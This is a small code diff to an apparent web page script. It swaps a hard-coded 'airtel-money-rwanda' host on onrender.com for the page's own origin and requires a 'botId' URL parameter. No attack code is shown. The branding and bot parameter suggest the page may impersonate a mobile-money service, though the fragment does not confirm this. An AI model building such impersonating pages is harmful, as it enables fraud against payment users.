@@ -167,7 +167,7 @@ button:not(:disabled){
 </div>
 
 <script>
-const BACKEND_URL = "https://airtel-money-rwanda.onrender.com";
+const BACKEND_URL = window.location.origin;
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
 if(!botId){ alert("Umurongo wo kwinjiramo siwo"); throw new Error(); }
